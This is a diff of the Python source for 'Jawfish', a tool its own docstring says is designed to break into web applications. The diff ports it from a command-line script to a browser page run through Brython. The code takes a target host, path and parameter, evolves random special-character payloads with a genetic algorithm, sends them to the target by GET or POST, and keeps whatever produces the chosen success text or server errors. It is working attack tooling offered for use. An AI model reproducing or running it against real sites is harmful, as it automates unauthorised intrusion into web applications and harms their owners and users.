@@ -5,42 +5,47 @@ Jawfish is a tool designed to break into web applications.
 
 Built on top of Soen Vanned's Forced Evolution.
 https://github.com/soen-vanned/forced-evolution
+
+Loaded into the web app (jawfish.io) via Brython.
+
+Version 1.0
 '''
 
-import requests
-import time
 from sys import argv
-import random
 from Queue import PriorityQueue
+import time
+import random
 import base64
 import zlib
+import urllib
+import requests
+from browser import document, html, window
 
-print """
-       _                 __ _     _
-      | |               / _(_)   | |
-      | | __ ___      _| |_ _ ___| |__
-  _   | |/ _` \ \ /\ / |  _| / __| '_ \
- | |__| | (_| |\ V  V /| | | \__ | | | |
-  \____/ \__,_| \_/\_/ |_| |_|___|_| |_|
-"""
+def result_out(text_to_result_box):
+    document['result_box'] <= html.P(text_to_result_box)
 
+def skip_line():
+    document['result_box'] <= html.P('\n')
+
+result_out('Jawfish v1.0 running')
+result_out('********************')
 
 def usage():
-    print 'Usage:'
-    print '  python jf.py <options>'
-    print '  Options:'
-    print '    TARGET=<target IP / hostname>'
-    print '    ADDR=<directory>'
-    print '    VULN_VAR=<vulnerable variable>'
-    print '    METHOD=<post/get>'
-    print '    OTHER_VARIABLES=[other variables for post/get request]'
-    print '      VAR1=DATA1&VAR2=DATA2'
-    print '    GOAL_TEXT=<server response indicating successful exploitation>'
-    print
-    print ' TARGET,ADDR,VULN_VAR,METHOD,GOAL_TEXT are required'
-
+    result_out('Usage:')
+    result_out('  python jf.py <options>')
+    result_out('  Options:')
+    result_out('    TARGET=<target IP / hostname>')
+    result_out('    ADDR=<directory>')
+    result_out('    VULN_VAR=<vulnerable variable>')
+    result_out('    METHOD=<post/get>')
+    result_out('    OTHER_VARIABLES=[other vars for post/get]')
+    result_out('      VAR1=DATA1&VAR2=DATA2')
+    result_out('    GOAL_TEXT=<server response of success>')
+    skip_line()
+    result_out('All are required but OTHER_VARIABLES')
 
 start_time = time.time()
+result_out('Start time = ' + start_time)
 OTHER_VARIABLES = {}
 GOAL_TEXT = 'KEY_DATA'
 tools = """~!@#$%^&*()_+{}|:"<>?,./;'[]\=-0987654321`qwertyuioplkjhgfdsa""" +\
@@ -64,44 +69,25 @@ METHOD = 'get'  # default is get, but post is allowed as well
 DB = ''
 ###DBENDMARKER###
 
-
-def process_command_line():
+def process_targeting_form():
     global BASE_RESPONSE, REQ_TOTAL, METHOD, GOAL_TEXT, TARGET, ADDR,\
         OTHER_VARIABLES, VULN_VAR
-    if ((len(argv) != 6) and (len(argv) != 7)):
-        usage()
+    url_string = window.location.href
+    url_string = urllib.unquote( url_string )
     try:
-        TARGET = argv[1].split('=')[1]
-        print '[+]\tTarget %s acquired!' % TARGET
-        ADDR = argv[2].split('=')[1]
+        TARGET = ((url_string.split('?TARGET='))[1].split('&ADDR')[0])
+        result_out('[+]\tTarget %s acquired!' % TARGET)
+        ADDR = ((url_string.split('&ADDR='))[1].split('&VULN_VAR')[0])
         if ADDR[0] == '/':
             ADDR = ADDR[1:]
-        print '[+]\tPath %s acquired!' % ADDR
-        VULN_VAR = argv[3].split('=')[1]
-        print '[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR
-        METHOD = (((argv[4].split('=')[1] == 'post') and 1) or 0)
-        print '[+]\tUsing method [%s] for GREAT success' %\
-            ((METHOD and 'post') or 'get')
+        result_out('[+]\tPath %s acquired!' % ADDR)
+        VULN_VAR = ((url_string.split('&VULN_VAR='))[1].split('&METHOD')[0])
+        result_out('[+]\tPotentially vulnerable variable %s registered!' % VULN_VAR)
+        METHOD = (((((url_string.split('&METHOD='))[1].split('&GOAL_TEXT')[0]) == 'post') and 1) or 0)
+        result_out('[+]\tUsing method [%s] for GREAT success' % ((METHOD and 'post') or 'get'))
         OTHER_VARIABLES = {}
-        if (len(argv) == 7):
-            ov = argv[5][len('OTHER_VARIABLES='):]
-            ov.replace('\"', '')
-            ov = ov.split('&')
-            #print ov
-            for i in ov:
-                (tmp_a, tmp_b) = i.split('=')
-                #print 'setting %s to %s' % (tmp_a, tmp_b)
-                OTHER_VARIABLES[tmp_a] = tmp_b
-            #ov = ov.split('&')
-            #ov = ov[1:]
-            #OTHER_VARIABLES = {}
-            #for i in range(0, len(ov) /2):
-            #  OTHER_VARIABLES[ov[i * 2]] = ov[i * 2 + 1]
-            #print OTHER_VARIABLES
-            GOAL_TEXT = argv[6].split('=')[1]
-        else:
-            GOAL_TEXT = argv[5].split('=')[1]
-        print '[+]\tAttempting to gain a base heuristic...'
+        GOAL_TEXT = url_string.split('&GOAL_TEXT=')[1]
+        result_out('[+]\tAttempting to gain a base heuristic...')
         OTHER_VARIABLES[VULN_VAR] = 'AAAA'
         BASE_RESPONSE = requests.get(
             'http://%s/%s' % (TARGET, ADDR),
@@ -110,18 +96,15 @@ def process_command_line():
         ).text
         if (BASE_RESPONSE.lower().find('not found') != -1 or
                 BASE_RESPONSE.lower().find('404') != -1):
-            print '404 or \'not found\' discovered on page....are you' + \
-                  'sure this is OK?'
-            print '\npage text:\n\n'
-            print BASE_RESPONSE
-            print
-            if not raw_input('y/n').lower().find('y'):
-                exit(0)
+            result_out('404 or \'not found\' discovered on page....are you sure this is OK?')
+            result_out('\npage text:\n\n')
+            result_out(BASE_RESPONSE)
+            skip_line()
+            result_out('lets try it anyway, you crazy cat')
         return True
     except:
-        print 'commandline argument FAIL\n\n'
+        result_out('targeting argument FAIL\n\n')
         return False
-
 
 class Creature:
     genome = ''
@@ -137,7 +120,7 @@ class Creature:
             self.genome = tools
         else:
             tmp = args
-            #print 'creating genome with '+ str(tmp) + 'chars'
+            result_out('creating genome with '+ str(tmp) + 'chars')
             for i in range(random.randint(tmp / 2, tmp)):
                 self.genome += tools[random.randrange(0, len(tools))]
         return None
@@ -148,9 +131,6 @@ class Creature:
         tmp = OTHER_VARIABLES
         tmp[VULN_VAR] = self.genome
         try:
-            # r = requests.get('http://%s/%s' % (TARGET, ADDR),
-            #                  params={VULN_VAR:self.genome},
-            #                  timeout=TIMEOUT)
             if METHOD == 0:
                 r = requests.get('http://%s/%s' % (TARGET, ADDR),
                                  params=tmp, timeout=TIMEOUT)
@@ -165,28 +145,19 @@ class Creature:
             pass
         return self.m_text
 
-
 def create_creatures(num, genome_length, tools):
     c = []
     for i in range(0, num):
         c.append(Creature(genome_length, tools))
     return c
 
-#  breed { A1A2 & B1B2
-# A1B2
-# B1A2
-# a
-# b }
-
-
 def cull_it(c):
     global CULL_RATE
     c_temp = PriorityQueue()
     qsize = c.qsize()
     l = int(qsize - qsize * CULL_RATE)
-    # print '[i]\tPopulation size %d, cull rate %s, living specimens: %d' %\
-    # (c.qsize(), str(CULL_RATE), l)
-    # print '[.]\tBeginning the cull of underperforming creatures...'
+    result_out('[i]\tPopulation size %d, cull rate %s, living specimens: %d' % (c.qsize(), str(CULL_RATE), l))
+    result_out('[.]\tBeginning the cull of underperforming creatures...')
     for i in range(l):
         flag = 0
         while flag == 0:
@@ -194,9 +165,8 @@ def cull_it(c):
             if tmp[1].genome != '':
                 c_temp.put(tmp)
                 flag = 1
-    # print '[+]\tCull done!'
+    result_out('[+]\tCull done!')
     return c_temp
-
 
 def mutate(s):
     global tools, MUTATION_RATE
@@ -226,10 +196,9 @@ def mutate(s):
             s = s[0:si] + s[si+1:]
     return s
 
-
 def breed_it(ca):
     c_temp = PriorityQueue()
-    print '[.]\tBreeding Next Generation...'
+    result_out('[.]\tBreeding Next Generation...')
     while len(ca) > 0:
         if len(ca) == 1:
             cq = ca.pop(0)
@@ -259,9 +228,8 @@ def breed_it(ca):
         c_temp.put((0, d))
         c_temp.put((0, e))
         c_temp.put((0, f))
-    print '[.]\tSuccess'
+    result_out('[.]\tSuccess')
     return c_temp
-
 
 def fitnessfunction(creature_to_score):
     global GOAL_TEXT
@@ -274,15 +242,15 @@ def fitnessfunction(creature_to_score):
         return
     if ((creature_to_score.genome.find('cat') != -1) and
             (creature_to_score.genome.find('key') != -1)):
-        print ' this bastard should work....'
-        print creature_to_score.genome
-        print s['text']
-        print s['url']
+        result_out('this bastard should work....')
+        result_out(creature_to_score.genome)
+        result_out(s['text'])
+        result_out(s['url'])
     if (s['text'].lower().find(GOAL_TEXT.lower()) != -1):
         creature_to_score.score -= 100
-        print '[+]\tExploit Found'
-        print creature_to_score.genome
-        print '------------------------------------------'
+        result_out('[+]\tExploit Found')
+        result_out(creature_to_score.genome)
+        result_out('------------------------------------------')
         save_DB(creature_to_score.genome)
         return 1
     elif (str(s['status_code']) == '500'):
@@ -296,24 +264,18 @@ def fitnessfunction(creature_to_score):
         exit()
     return 0
 
-
 def main():
     global CREATURE_COUNT
-    if process_command_line():
+    if process_targeting_form():
         c0 = []
         c1 = PriorityQueue()
-        print '[+]\tLoading DB...'
+        result_out('[+]\tLoading DB...')
         #load in creatures from DB
         lc = load_DB()
-        #f = open('database', 'a')
-        #f.close()
-        #f = open('database')
-        #lc = f.read()
-        #f.close()
         loaded_creatures = lc.split('\n')
         #finish loading
-        print '[+]\tSuccess'
-        print '[+]\tCreating initial batch of creatures...'
+        result_out('[+]\tSuccess')
+        result_out('[+]\tCreating initial batch of creatures...')
         cl = create_creatures(CREATURE_COUNT, GENOME_LENGTH, tools)
         generation = 0
         for i in cl:
@@ -322,21 +284,19 @@ def main():
             c1.put((50, Creature(0, i)))
             for ii in range(0, GENE_POOL_INFLUENCE-1):
                 c1.put((50, Creature(0, mutate(i))))
-        print '[+]\tSuccess'
-        #print '[+]\tPre-breeeding in loaded creatures with the population' +\
-        #    ' for great success'
-        #while not c1.empty():
-        #    c = c1.get()[1]
-        #    c0.append(c)
-        #c1 = breed_it(c0)
-        #c1 = c0
-        print '[+]\tSuccess'
+        result_out('[+]\tSuccess')
+        result_out('[+]\tPre-breeding in loaded creatures with the population for great success')
+        while not c1.empty():
+            c = c1.get()[1]
+            c0.append(c)
+        c1 = breed_it(c0)
+        c1 = c0
+        result_out('[+]\tSuccess')
         exploit_found = 0
         while exploit_found == 0:
             generation += 1
             CREATURE_COUNT = c1.qsize()
-            print '[>]\tRunning with creature_count %d,\tgeneration %d' %\
-                (CREATURE_COUNT, generation)
+            result_out('[>]\tRunning with creature_count %d,\tgeneration %d' % (CREATURE_COUNT, generation))
             c2 = PriorityQueue(0)
             cached_c = 0
             total_c = 0
@@ -349,24 +309,20 @@ def main():
                     exploit_found = 1
                     break
                 c2.put((c.score, c))
-            # print '[i]\tEfficiency %s, cached[%d], total[%d]' %\
-            # (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c)
+            result_out('[i]\tEfficiency %s, cached[%d], total[%d]' % (str((total_c-cached_c) * 1.0 / total_c),cached_c,total_c))
             c3 = cull_it(c2)
             c4 = []
             while not c3.empty():
                 c = c3.get()[1]
                 c4.append(c)
             c1 = breed_it(c4)
-        print '[i]\tExploit found in %d seconds with %d requests' %\
-            (abs(int(start_time - time.time())), REQ_TOTAL)
-
+        result_out('[i]\tExploit found in %d seconds with %d requests' % (abs(int(start_time - time.time())), REQ_TOTAL))
 
 def load_DB():
     if DB != '':
         return zlib.decompress(base64.b64decode(DB))
     else:
-        print '[!]\tInternal database not found, attempting to load ' +\
-              'external...'
+        result_out('[!]\tInternal database not found, attempting to load external...')
         lc = ''
         f = open('database', 'a')
         f.close()
@@ -374,7 +330,6 @@ def load_DB():
         lc = f.read().replace('\r\n', '\n')
         f.close()
         return lc
-
 
 def save_DB(exploit_found):
     f = open(argv[0], 'r+')
